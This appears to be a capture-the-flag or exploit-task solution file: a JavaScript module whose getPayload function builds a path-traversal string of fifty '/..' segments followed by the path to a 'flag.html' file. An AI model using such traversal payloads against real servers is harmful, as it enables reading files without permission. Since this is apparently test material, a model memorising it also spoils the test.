function getPayload() {
  function genstr(n) {
    return "/..".repeat(n) + path.resolve(__dirname, "../flag.html");
  }

  return genstr(50); // The number 50 is derived from the /.. repeated 50 times in the genstr function
}

module.exports = { getPayload };